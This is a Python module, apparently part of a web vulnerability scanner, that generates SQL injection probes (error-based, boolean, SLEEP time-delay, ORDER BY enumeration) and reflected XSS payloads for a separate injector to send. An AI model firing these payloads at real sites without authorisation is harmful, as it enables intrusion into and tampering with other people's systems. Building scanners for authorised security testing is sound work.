from __future__ import annotations

from typing import TypedDict


class AttackRequest(TypedDict):
    """변형기가 파라미터 값에 적용할 단일 공격 요청 템플릿."""

    set_id: str
    payload: str


def _sqli_error_requests() -> list[AttackRequest]:
    """SQL 문법 오류 유발 여부를 확인하는 Error-based SQLi 요청을 반환한다."""

    payloads = [
        "{value}'",
        '{value}"',
        "{value}'-- ",
        '{value}"-- ',
        "{value}')",
    ]
    return _numbered_requests("SQLI_error", payloads)


def _sqli_boolean_requests() -> list[AttackRequest]:
    """동일 번호의 true/false 요청을 한 쌍으로 비교할 수 있게 반환한다."""

    request_pairs = [
        (
            "{value}' AND '1'='1",
            "{value}' AND '1'='2",
        ),
        (
            '{value}" AND "1"="1',
            '{value}" AND "1"="2',
        ),
        (
            "{value} AND 1=1",
            "{value} AND 1=2",
        ),
    ]

    requests: list[AttackRequest] = []
    for index, (true_payload, false_payload) in enumerate(request_pairs, start=1):
        suffix = f"{index:03d}"
        requests.extend(
            [
                {
                    "set_id": f"SQLI_boolean_true_{suffix}",
                    "payload": true_payload,
                },
                {
                    "set_id": f"SQLI_boolean_false_{suffix}",
                    "payload": false_payload,
                },
            ]
        )
    return requests


def _sqli_time_delay_requests(delay_seconds: int) -> list[AttackRequest]:
    """원본 요청의 응답 시간과 비교할 Time-based SQLi 지연 요청을 반환한다.

    원본 요청이 이미 기준 응답으로 전송되므로 SLEEP(0) 제어 요청과 동일한
    지연 요청의 중복 retry 항목은 만들지 않는다.
    """

    payloads = [
        f"{{value}}' AND SLEEP({delay_seconds})-- ",
        f'{{value}}" AND SLEEP({delay_seconds})-- ',
        f"{{value}} AND SLEEP({delay_seconds})",
    ]
    return _numbered_requests("SQLI_time_delay", payloads)


def _sqli_order_by_requests(max_order_by: int) -> list[AttackRequest]:
    """ORDER BY 1부터 max_order_by까지 세 가지 입력 형태로 반환한다."""

    payloads: list[str] = []
    for index in range(1, max_order_by + 1):
        payloads.extend(
            [
                f"{{value}}' ORDER BY {index}-- ",
                f'{{value}}" ORDER BY {index}-- ',
                f"{{value}} ORDER BY {index}",
            ]
        )
    return _numbered_requests("SQLI_order_by", payloads)


def _xss_reflected_requests() -> list[AttackRequest]:
    """브라우저에서 실행 가능한 Reflected XSS 공격문을 반환한다.

    {token}은 변형기가 요청별 고유 문자열로 치환한다. 토큰은 단순 반사 여부만
    확인하기 위한 독립 요청이 아니라, 실제 XSS 공격문이 응답에 반사되었는지
    식별하기 위한 표식으로 사용한다.
    """

    payloads = [
        "<script>alert('{token}')</script>",
        '"><img src=x onerror=alert(\'{token}\')>',
        "'><svg onload=alert(\"{token}\")>",
        '" onmouseover=alert(\'{token}\') x="',
        "</textarea><script>alert('{token}')</script>",
        "</script><script>alert('{token}')</script>",
    ]
    return _numbered_requests("XSS_reflected", payloads)


def _numbered_requests(prefix: str, payloads: list[str]) -> list[AttackRequest]:
    """payload 순서대로 prefix_001 형식의 set_id를 부여한다."""

    return [
        {
            "set_id": f"{prefix}_{index:03d}",
            "payload": payload,
        }
        for index, payload in enumerate(payloads, start=1)
    ]


def build_attack_request_list(
    *,
    max_order_by: int = 10,
    delay_seconds: int = 5,
    include_sqli: bool = True,
    include_xss: bool = True,
) -> list[AttackRequest]:
    """변형기가 사용할 공격 요청 목록만 반환한다.

    입력:
        max_order_by: 생성할 ORDER BY의 최대 열 번호.
        delay_seconds: Time-based SQLi의 SLEEP 지연 시간.
        include_sqli: SQLi 요청 포함 여부.
        include_xss: XSS 요청 포함 여부.

    출력:
        set_id와 payload만 포함하는 평탄한 공격 요청 목록.

    이 함수는 targets.json을 읽거나, 값을 치환하거나, HTTP 요청을 보내거나,
    응답을 판정하지 않는다. 해당 작업은 변형기·주입기·탐지기의 책임이다.
    """

    if include_sqli and max_order_by < 1:
        raise ValueError("max_order_by must be greater than or equal to 1")
    if include_sqli and delay_seconds < 1:
        raise ValueError("delay_seconds must be greater than or equal to 1")

    requests: list[AttackRequest] = []

    if include_sqli:
        requests.extend(_sqli_error_requests())
        requests.extend(_sqli_boolean_requests())
        requests.extend(_sqli_time_delay_requests(delay_seconds))
        requests.extend(_sqli_order_by_requests(max_order_by))

    if include_xss:
        requests.extend(_xss_reflected_requests())

    return requests